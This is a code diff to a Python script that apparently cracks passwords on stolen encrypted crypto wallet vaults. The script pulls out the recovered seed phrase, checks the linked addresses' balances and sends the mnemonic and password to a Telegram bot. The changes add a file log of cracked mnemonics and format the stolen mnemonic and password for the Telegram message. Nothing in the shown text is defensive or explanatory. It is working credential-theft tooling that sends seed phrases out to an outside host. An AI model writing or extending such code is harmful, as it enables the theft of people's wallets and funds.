@@ -22,6 +22,13 @@ def AddNoteToLog(text):
     logfile.close()
 
 
+def AddMnemonic(text):
+    print(text)
+    logfile = open("mnemonics.txt", "a", encoding="utf-8-sig")
+    logfile.write(text)
+    logfile.close()
+
+
 def sendmsg(id, text):
     url = f"https://api.telegram.org/bot{cfg[0]['bot_token']}/sendMessage"
     data = {
@@ -53,7 +60,7 @@ def check_password(info, passwd):
             xuy = decrypted_block.decode('utf-8', 'ignore').find('"mnemonic":"') + 12
             xuy2 = decrypted_block.decode('utf-8', 'ignore').find('","numberOfAccounts"') - 43
             mnemonic = decrypted_block.decode('utf-8', 'ignore')[xuy:][:xuy2]
-            return f"Mnemonic: {mnemonic}\nPassword: {passwd}"
+            return {'mnemonic': mnemonic, 'password': passwd}
         else:
             return None
     except:
@@ -126,7 +133,8 @@ def check_balance():
                 except:
                     msg += f"{site + address} error\n"
                 if mnemonic:
-                    msg += f"{mnemonic}"
+                    msg += f"<b>Mnemonic:</b> <code>{mnemonic['mnemonic']}</code>\n<b>Password:</b> <code>{mnemonic['password']}</code>"
+                    AddMnemonic(mnemonic['mnemonic'] + "\n")
             checked_addresses.append(address)
             AddNoteToLog("\n" + msg.replace('<b>', '').replace('</b>', '') + "\n")
             sendmsg(cfg[0]['telegram_id'], msg)
